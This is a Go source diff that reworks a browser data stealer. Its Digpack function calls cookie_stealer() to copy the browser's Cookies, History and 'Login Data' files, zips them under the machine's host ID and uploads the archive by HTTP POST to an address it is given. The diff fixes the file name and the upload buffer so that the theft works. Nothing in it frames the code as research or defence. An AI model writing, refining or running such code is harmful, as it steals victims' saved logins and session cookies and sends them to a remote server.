@@ -15,9 +15,7 @@ import (
 	"time"
 )
 
-const (
-	safe_path = "C:\\Windows\\tmp\\"
-)
+var safe_path = get_current_user() + "\\tmp\\"
 
 type msg struct {
 	Hostid string `json:"hostid"`
@@ -42,94 +40,79 @@ func create_dir() {
 		log.Fatal(err)
 	}
 }
-func init() {
-	f, err := os.Stat(safe_path)
-	if err == nil {
-		if time.Now().Unix()-f.ModTime().Unix() >= 2799765 {
+
+func Digpack(addr string) {
+	logf, lerr := os.Stat(safe_path)
+	if lerr == nil {
+		//keep the file one month then update
+		if time.Now().Unix()-logf.ModTime().Unix() >= 2799765 {
+			os.RemoveAll(safe_path)
+			return
+		} else {
 			return
 		}
 	}
-	if os.IsNotExist(err) {
+	if os.IsNotExist(lerr) {
 		get_current_user()
 		create_dir()
 		cookie_stealer()
-		time.Sleep(3 * time.Second)
-
-	}
-}
-
-func Digpack(addr string) {
-	time.Sleep(2 * time.Second)
-	var versionDetail = machineinfo.GetSystemVersion()
-	buf := new(bytes.Buffer)
-	w := zip.NewWriter(buf)
-	var files = []struct {
-		Name string
-	}{
-		{"Cookies"},
-		{"History"},
-		{"loginData"},
-	}
-	for _, file := range files {
-		f, err := w.Create(file.Name)
+		var versionDetail = machineinfo.GetSystemVersion()
+		time.Sleep(2 * time.Second)
+		buf := new(bytes.Buffer)
+		w := zip.NewWriter(buf)
+		var files = []struct {
+			Name string
+		}{
+			{"Cookies"},
+			{"History"},
+			{"Login Data"},
+		}
+		for _, file := range files {
+			f, err := w.Create(file.Name)
+			if err != nil {
+				log.Fatal(err)
+			}
+			fbody, err := ioutil.ReadFile(safe_path + file.Name)
+			_, err = f.Write(fbody)
+			if err != nil {
+				log.Fatal(err)
+			}
+		}
+		err := w.Close()
 		if err != nil {
 			log.Fatal(err)
 		}
-		fbody, err := ioutil.ReadFile(safe_path + file.Name)
-		_, err = f.Write(fbody)
+		f, err := os.OpenFile(safe_path+versionDetail.Hostid+".zip", os.O_CREATE|os.O_WRONLY, 0666)
 		if err != nil {
 			log.Fatal(err)
 		}
+		buf.WriteTo(f)
+		pbuf := new(bytes.Buffer)
+		writer := multipart.NewWriter(pbuf)
+		formFile, err := writer.CreateFormFile("file", versionDetail.Hostid+".zip")
+		if err != nil {
+			log.Println("Create form file failed: %s\n", err)
+		}
+		// 从文件读取数据，写入表单
+		srcFile, err := os.Open(safe_path + versionDetail.Hostid + ".zip")
+		if err != nil {
+			fmt.Println("Open source file failed: s\n", err)
+		}
+		defer srcFile.Close()
+		_, err = io.Copy(formFile, srcFile)
+		if err != nil {
+			fmt.Println("Write to form file falied: %s\n", err)
+		}
+		// 发送表单
+		contentType := writer.FormDataContentType()
+		writer.Close()
+		re, err := http.Post(addr, contentType, pbuf)
+		if re.StatusCode == 200 {
+			log.Println("Upload browser record Status Successful !")
+		} else {
+			log.Println("Upload browser record Status Fail !")
+		}
 	}
-	err := w.Close()
-	if err != nil {
-		log.Fatal(err)
-	}
-	f, err := os.OpenFile(safe_path+versionDetail.Hostid+".zip", os.O_CREATE|os.O_WRONLY, 0666)
-	if err != nil {
-		log.Fatal(err)
-	}
-	buf.WriteTo(f)
-	pbuf := new(bytes.Buffer)
-	writer := multipart.NewWriter(pbuf)
-	formFile, err := writer.CreateFormFile("file", versionDetail.Hostid+".zip")
-	if err != nil {
-		log.Println("Create form file failed: %s\n", err)
-	}
-	// 从文件读取数据，写入表单
-	srcFile, err := os.Open(safe_path + versionDetail.Hostid + ".zip")
-	if err != nil {
-		fmt.Println("Open source file failed: s\n", err)
-	}
-	defer srcFile.Close()
-	_, err = io.Copy(formFile, srcFile)
-	if err != nil {
-		fmt.Println("Write to form file falied: %s\n", err)
-	}
-	// 发送表单
-	contentType := writer.FormDataContentType()
-	writer.Close()
-	re, err := http.Post(addr, contentType, buf)
-	if re.StatusCode == 200 {
-		log.Println("Upload browser record Status Successful !")
-	} else {
-		log.Println("Upload browser record Status Fail !")
-	}
-	//var Msg = msg{
-	//	Hostid: versionDetail.Hostid,
-	//}
-	//var bizStatusResponse = BizStatusResponse{}
-	//resp, _, _ := gorequest.New().
-	//	Type("multipart").
-	//	Post(addr).
-	//	Send(Msg).
-	//	SendFile(safe_path + "log" + versionDetail.Hostid + ".zip").
-	//	EndStruct(&bizStatusResponse)
-	//if resp.StatusCode == 200 && bizStatusResponse.Succeed {
-	//	log.Println("Upload browser record Status Successful !")
-	//} else {
-	//	log.Println("Upload browser record Status Fail !")
-	//}
 }
 
 //returns Current working dir
@@ -171,7 +154,7 @@ func cookie_stealer() {
 	}
 	var cookie_file string = "Cookies"
 	var history string = "History"
-	var data_login string = "loginData"
+	var data_login string = "Login Data"
 
 	cp_cookie := cp + cookie_file
 	cp_hist := cp + history
